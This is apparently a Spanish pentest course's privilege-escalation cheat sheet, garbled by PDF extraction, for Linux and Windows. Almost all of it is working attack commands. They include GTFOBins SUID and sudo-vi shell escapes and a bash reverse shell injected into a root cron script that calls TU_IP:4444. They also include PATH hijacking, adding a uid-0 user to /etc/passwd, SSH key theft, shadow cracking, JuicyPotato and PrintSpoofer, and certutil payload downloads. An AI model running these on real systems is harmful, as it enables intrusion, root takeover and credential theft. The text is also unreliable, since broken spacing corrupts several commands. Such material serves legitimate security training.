Bloque
06

BL OQUE 6 Â· ESC AL AD A DE PRIVILEGIOSEsc alada de privilegiosChecklist completa de comandos para Linux y Windo ws: SUID , cr onjobs, sudo -l, capabilities, t ok ens, JuicyP otat o y 
G TFOBins.6. 1 Esc alada Linux â€” Chulet a rÃ¡pida paso a pasoP aso 0: C ont e xt o y est abilidadwhoami && id && uname -a && hostname && ip a
script /dev/null -qc bashP aso 1: EnumeraciÃ³n esencial# SUID
find / -perm -4000 -type f 2>/dev/null
# Cron
crontab -l 2>/dev/null; ls -la /etc/cron* /var/spool/cron* 2>/dev/null
# Sudo
sudo -l 2>/dev/null
# Procesos
ps aux | grep -v '\['
# Red y puertos locales
ss -tulpn
# Permisos "raros"
find / -writable -type d 2>/dev/null | head
find / -perm -2 -type d 2>/dev/null | grep -v proc | head
# Archivos interesantes
ls -la /root/ /home/*/ 2>/dev/null
grep -R "password|secret|token" -n /etc 2>/dev/null | head
NO T ASi t e atascas, lanza LinPEA S desde /tmp: r ecorr e sist emÃ¡ticament e t odos est os v ect or es y r esalta los hallaz gos mÃ¡s 
pr omet edor es.R ut a A : B inarios SUID â†’ G TF OB insfind / -perm -4000 -type f 2>/dev/null
# B usca el binario resultante ( vim , find , bash , less , tar , cp , awk , perl ,
# python , openssl , mount ...) en https :// gtfobins . github . io
# y aplica la tecnica "SUI D " indicada .
# Ej emplo con find :
find . -exec /bin/sh -p \; -quit22

BL OQUE 6 Â· ESC AL AD A DE PRIVILEGIOSEsc alada de privilegiosRut a B: sudo -lsudo -l
# Si aparece, por ejemplo:
# (ALL) NOPASSWD: /usr/bin/vi /ruta/archivo.conf
sudo /usr/bin/vi /ruta/archivo.conf
# Dentro de vi:
:set shell=/bin/bash:shell
# Resultado: shell como rootRut a C: Cronjobs con rut as edit ablesgrep -R "run-parts" -n /etc/cron* 2>/dev/null
echo 'bash -c "bash -i >& /dev/tcp/TU_IP/4444 0>&1"' >> /ruta/script.sh
# Ponerse a la escucha en Kali:
nc -lvnp 4444Rut a D: C apabilitiesgetcap -r / 2>/dev/null
# Si aparece cap_setuid, cap_dac_read_search, etc. en python/perl/tar/openssl,
# consulta GTFOBins la tecnica de "Capabilities" para ese binario.Rut a E: P A TH Hijackingecho '/bin/bash -p' > /tmp/ls && chmod +x /tmp/l s
e x port PAT H =/tmp: $ PAT H # si un script root ejecuta 'ls' sin ruta absoluta
23

BL OQUE 6 Â· ESC AL AD A DE PRIVILEGIOSEsc alada de privilegiosRut a F: Archiv os con permisos dÃ©bilesfind /etc -type f -writable 2>/dev/null
ls -la /etc/passwd /etc/shadow
# Si /etc/passwd es escribible, anadir usuario con nueva contrasena:
openssl passwd -6 'nueva_pass'
# Copiar el hash resultante y anadir linea a /etc/passwd con uid/gid 0Rut a G: NFS con no_roo t_squash y grupo Dock er# NFS: compilar un binario SUID en el cliente, copiarlo al share,
# ejecutarlo en el servidor.
# Docker: si el usuario esta en el grupo docker:
id
docker run -v /:/mnt --rm -it alpine chroot /mnt sh6.2 Credenciales y hashes: recuperar y abusar# Claves SSH
find / -name "id_rsa" -o -name "authorized_keys" 2>/dev/null
cat id_rsa # copiar tal cual, incluidas lineas BEGIN/END
chmod 600 id_rsa
ssh -i id_rsa usuario@IP# Configs con secreto s
grep - R "password | passwd | secret | token" -n /opt /var/www /home /etc \
 2>/dev/null | head
# Crackear /etc/shadow si es legibl e
john --wordlist = /usr/share/wordlists/rockyou . t x t hashes . t xt
# Generar hash S HA - 51 2 crypt ( formato $ 6 $ S ALT$HA S H)
mkpasswd -m sha- 51 2 'nueva_pass'
2 4

BL OQUE 6 Â· ESC AL AD A DE PRIVILEGIOSEsc alada de privilegios6.3 P ost-roo t: higiene y v erific aciÃ³nwhoami && id
cat /root/root.txt
cat ~/.bash_history 2>/dev/null
ls -la /root/ /var/backups/ 2>/dev/null6.4 Esc alada en Windo ws: modelo de seguridad y t ok ensEl comando whoami /priv muestra los privilegios habilitados del usuario actual. SeImpersonat ePrivilege es uno de los 
mÃ¡s r ele v ant es: permit e a un pr oceso "impersonar" a otr o usuario, y en un cont e xt o vulnerable se puede encadenar 
hasta con v er tirse en NT AUTHORITY\SYSTEM.whoami /priv
systeminfo # version exacta y arquitectura antes de elegir herramienta
# En sistemas modernos con SeImpersonatePrivilege:
# JuicyPotato (hasta Windows 10 / Server 2016, requiere CLSID valido)
JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe \
 -a "/c whoami > C:\out.txt" -t * -c {CLSID}
# PrintSpoofer (alternativa mas moderna, no requiere CLSID)
PrintSpoofer.exe -i -c cmdEn sist emas muy antiguos (Windo ws Ser v er 2003), Churrasco e xplota un CVE especÃ­fico de esa Ã©poca (v er el 
walkt hr ough complet o de Grann y en el Bloque 5 , con comandos paso a paso ).6. 5 T rans f erencia de archiv os en Windo wsA dif er encia de L inux, Windo ws no siempr e tiene curl/w get disponibles por def ect o. Alt ernativ as prÃ¡cticas:# certutil (puede ser detectado por Windows Defender en sistemas modernos)
certutil -urlcache -split -f http: //TU _IP/archivo.exe archivo.ex e
# PowerShell
Invoke-Web R equest - U ri http: //TU _IP/archivo.exe - O ut F ile archivo.ex e
IW R http: //TU _IP/archivo.exe - O ut F ile archivo.ex e
# Servidor HTT P en K ali para servir archivo s
python3 -m http.server 8 06.6 C asos p r Ã¡ cticos tra b a j ados: p a trones a reconocer25

BL OQUE 6 Â· ESC AL AD A DE PRIVILEGIOSEsc alada de privilegiosCr onjob in visible + plugin vulnerable de W or dPr ess: un cr onjob que se ejecuta con permisos ele v ados sobr e un 
plugin desactualizado permit e in y ectar cÃ³digo que se ejecuta en el siguient e ciclo.ShellShock: vulnerabilidad hist Ã³rica en Bash que permit e ejecutar comandos a tra v Ã©s de v ariables de ent orno mal 
saneadas â€” pa yload tÃ­pico: () { :; }; comando_ malicioso en una cabecera HTTP pr ocesada por un script CGI.Blind Command Injection: no se v e la salida del comando per o se confirma su ejecuciÃ³n por tiempos de r espuesta 
(pa yload tÃ­pico: ; sleep 10 y medir el r etraso ).LXD /cont enedor es: per t enecer al grupo lx d permit e cr ear un cont enedor privilegiado que monta el disco del host, 
dando acceso de escritura como r oot al sist ema de ar chiv os complet o.
26

â†’

â†’
